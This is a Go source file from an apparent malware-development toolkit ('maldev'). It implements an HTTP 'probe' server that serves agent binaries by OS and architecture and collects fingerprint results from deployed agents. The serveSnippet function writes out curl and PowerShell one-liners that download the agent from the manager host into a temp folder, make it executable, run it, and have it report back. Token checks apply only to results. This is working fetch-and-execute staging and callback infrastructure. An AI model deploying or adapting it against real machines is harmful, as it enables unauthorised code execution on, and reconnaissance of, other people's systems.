package httpsrv

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/oioio-space/maldev/internal/manager/probe"
	"github.com/oioio-space/maldev/internal/manager/service"
)

// ProbeServer serves probe agent binaries, shell snippets, and accepts
// fingerprint results from deployed probe agents.
type ProbeServer struct {
	probe    *service.ProbeService
	settings *service.SettingsService

	mu        sync.Mutex
	srv       *http.Server
	listener  net.Listener
	startedAt time.Time
	lastErr   string

	requests atomic.Uint64
	lastReq  atomic.Int64

	events chan Event
}

// NewProbeServer wires the server against the given services.
func NewProbeServer(p *service.ProbeService, settings *service.SettingsService) *ProbeServer {
	return &ProbeServer{
		probe:    p,
		settings: settings,
		events:   make(chan Event, 256),
	}
}

func (s *ProbeServer) Name() string { return "probe" }

// Start binds the listener using the address from SettingsService and begins
// serving. Returns an error if already running.
func (s *ProbeServer) Start(ctx context.Context) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.srv != nil {
		return errors.New("probe server already running")
	}
	cfg, err := s.settings.GetServerConfig(ctx)
	if err != nil {
		return fmt.Errorf("server config: %w", err)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/probe/", s.handle)
	ln, err := net.Listen("tcp", cfg.ProbeListen)
	if err != nil {
		s.lastErr = err.Error()
		return fmt.Errorf("listen %s: %w", cfg.ProbeListen, err)
	}
	s.listener = ln
	httpSrv := &http.Server{Handler: mux, ReadTimeout: 10 * time.Second, WriteTimeout: 30 * time.Second}
	s.srv = httpSrv
	s.startedAt = time.Now()
	go func() {
		var serveErr error
		if cfg.ProbeTLSCert != "" && cfg.ProbeTLSKey != "" {
			serveErr = httpSrv.ServeTLS(ln, cfg.ProbeTLSCert, cfg.ProbeTLSKey)
		} else {
			serveErr = httpSrv.Serve(ln)
		}
		if serveErr != nil && !errors.Is(serveErr, http.ErrServerClosed) {
			s.mu.Lock()
			s.lastErr = serveErr.Error()
			s.mu.Unlock()
			s.emit(Event{At: time.Now(), Server: s.Name(), Kind: "error", Note: serveErr.Error()})
		}
	}()
	s.emit(Event{At: time.Now(), Server: s.Name(), Kind: "started", Note: ln.Addr().String()})
	return nil
}

// Stop gracefully shuts down within timeout.
func (s *ProbeServer) Stop(timeout time.Duration) error {
	s.mu.Lock()
	srv := s.srv
	s.srv = nil
	s.listener = nil
	s.mu.Unlock()
	if srv == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	err := srv.Shutdown(ctx)
	s.emit(Event{At: time.Now(), Server: s.Name(), Kind: "stopped"})
	return err
}

// Status returns a non-blocking snapshot of the server's runtime state.
func (s *ProbeServer) Status() Status {
	s.mu.Lock()
	defer s.mu.Unlock()
	st := Status{LastError: s.lastErr}
	if s.srv != nil {
		st.Running = true
		st.StartedAt = s.startedAt
	}
	if s.listener != nil {
		st.ListenAddr = s.listener.Addr().String()
	}
	st.Requests = s.requests.Load()
	if last := s.lastReq.Load(); last != 0 {
		st.LastReq = time.Unix(0, last)
	}
	return st
}

// Events returns the per-request and lifecycle event channel.
func (s *ProbeServer) Events() <-chan Event { return s.events }

func (s *ProbeServer) emit(e Event) {
	select {
	case s.events <- e:
	default:
		// Drop oldest to keep the channel from blocking the hot path.
		select {
		case <-s.events:
		default:
		}
		select {
		case s.events <- e:
		default:
		}
	}
}

func (s *ProbeServer) emitReq(r *http.Request, status int) {
	s.emit(Event{
		At:     time.Now(),
		Server: s.Name(),
		Kind:   "request",
		Method: r.Method,
		Path:   r.URL.Path,
		Status: status,
		Remote: r.RemoteAddr,
	})
}

// handle routes /probe/<token>/<verb>[/<osarch>] to the right handler.
func (s *ProbeServer) handle(w http.ResponseWriter, r *http.Request) {
	s.requests.Add(1)
	s.lastReq.Store(time.Now().UnixNano())

	// expect path segments: ["probe", <token>, <verb>, optional <osarch>]
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 3 || parts[0] != "probe" {
		http.NotFound(w, r)
		s.emitReq(r, http.StatusNotFound)
		return
	}
	token, verb := parts[1], parts[2]
	switch verb {
	case "agent":
		var osArch string
		if len(parts) >= 4 {
			osArch = parts[3]
		} else {
			osArch = detectOSArch(r)
		}
		s.serveAgent(w, r, token, osArch)
	case "snippet":
		s.serveSnippet(w, r, token)
	case "result":
		s.serveResult(w, r, token)
	default:
		http.NotFound(w, r)
		s.emitReq(r, http.StatusNotFound)
	}
}

func (s *ProbeServer) serveAgent(w http.ResponseWriter, r *http.Request, token, osArch string) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		s.emitReq(r, http.StatusMethodNotAllowed)
		return
	}
	if osArch == "" {
		http.Error(w, fmt.Sprintf("specify an os-arch in the URL (available: %v)", probe.AvailableTargets()), http.StatusBadRequest)
		s.emitReq(r, http.StatusBadRequest)
		return
	}
	bin, err := probe.ServeAgent(osArch)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		s.emitReq(r, http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="maldev-probe-%s"`, osArch))
	_, _ = w.Write(bin)
	s.emitReq(r, http.StatusOK)
	_ = token // token is not validated for /agent — only /result enforces
}

func (s *ProbeServer) serveSnippet(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		s.emitReq(r, http.StatusMethodNotAllowed)
		return
	}
	host := r.Host
	if host == "" {
		host = "<manager-host>:<port>"
	}
	base := fmt.Sprintf("%s://%s/probe/%s", schemeFor(r), host, token)
	snippet := fmt.Sprintf(`# Linux/macOS
URL="%s"
curl -fsSL "$URL/agent/$(uname -s | tr A-Z a-z)-$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/')" \
  -o /tmp/maldev-probe && chmod +x /tmp/maldev-probe \
  && /tmp/maldev-probe "$URL/result"

# Windows PowerShell
$URL = "%s"
Invoke-WebRequest "$URL/agent/windows-amd64" -OutFile $env:TEMP\maldev-probe.exe
& "$env:TEMP\maldev-probe.exe" "$URL/result"
`, base, base)
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	_, _ = w.Write([]byte(snippet))
	s.emitReq(r, http.StatusOK)
}

func (s *ProbeServer) serveResult(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		s.emitReq(r, http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 64*1024)
	var result probe.AgentResult
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		s.emitReq(r, http.StatusBadRequest)
		return
	}
	if err := s.probe.ConsumeToken(r.Context(), token, result, r.RemoteAddr); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		s.emitReq(r, http.StatusBadRequest)
		return
	}
	w.WriteHeader(http.StatusOK)
	s.emitReq(r, http.StatusOK)
}

// detectOSArch infers the target os-arch from the User-Agent header when the
// client omits it from the URL path. Falls back to an empty string, which
// causes the handler to return a 400 with the available target list.
func detectOSArch(r *http.Request) string {
	ua := strings.ToLower(r.UserAgent())
	switch {
	case strings.Contains(ua, "windows"):
		return "windows-amd64"
	case strings.Contains(ua, "darwin"), strings.Contains(ua, "macintosh"):
		if strings.Contains(ua, "arm64") {
			return "darwin-arm64"
		}
		return "darwin-amd64"
	case strings.Contains(ua, "linux"):
		if strings.Contains(ua, "arm64") || strings.Contains(ua, "aarch64") {
			return "linux-arm64"
		}
		return "linux-amd64"
	}
	return ""
}

// schemeFor returns "https" when the connection is TLS, otherwise "http".
func schemeFor(r *http.Request) string {
	if r.TLS != nil {
		return "https"
	}
	return "http"
}
